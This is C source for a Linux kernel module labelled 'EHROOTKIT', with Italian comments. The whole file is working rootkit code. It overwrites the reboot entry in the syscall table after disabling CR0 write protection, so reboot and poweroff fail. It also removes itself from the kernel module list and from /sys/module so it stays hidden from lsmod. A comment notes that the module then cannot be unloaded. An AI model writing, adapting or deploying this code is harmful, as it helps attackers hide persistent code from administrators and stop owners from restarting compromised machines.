#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/syscalls.h>
#include <linux/list.h>

unsigned long *sys_call_table_address;
asmlinkage int (*old_reboot_sys_call)(int, int, int, void*);

static void my_write_cr0(long value) {
    __asm__ volatile("mov %0, %%cr0" :: "r"(value) : "memory");
}

#define disable_write_protection() my_write_cr0(read_cr0() & (~0x10000))
#define enable_write_protection() my_write_cr0(read_cr0() | (0x10000))

// Funzione fake per bloccare reboot e poweroff
asmlinkage int hackers_reboot(int magic1, int magic2, int cmd, void *arg) {
    printk(KERN_NOTICE "EHROOTKIT: Bloccato tentativo di Reboot/Poweroff!\n");
    return -EPERM; 
}

// Funzione per nascondere il modulo da lsmod
void hide_module(void) {
    list_del(&THIS_MODULE->list); // Rimuove dalla lista dei moduli
    kobject_del(&THIS_MODULE->mkobj.kobj); // Rimuove da /sys/module
}

static int __init startup(void) {
    sys_call_table_address = (unsigned long *)0xffffffff81401200;

    // 1. Nascondiamo il modulo (diventa invisibile a lsmod)
    hide_module();

    // 2. Installiamo l'hook
    old_reboot_sys_call = (void *)sys_call_table_address[__NR_reboot];
    disable_write_protection();
    sys_call_table_address[__NR_reboot] = (unsigned long)hackers_reboot;
    enable_write_protection();

    printk(KERN_NOTICE "EHROOTKIT: Modulo invisibile e Hook attivo.\n");
    return 0;
}

static void __exit shutdown(void) {
    // NOTA: Se il modulo è nascosto con list_del, rmmod fallirà perché non lo trova.
    // In una versione reale, dovresti prima ri-aggiungerlo alla lista.
    disable_write_protection();
    sys_call_table_address[__NR_reboot] = (unsigned long)old_reboot_sys_call;
    enable_write_protection();
}

module_init(startup);
module_exit(shutdown);
MODULE_LICENSE("GPL");
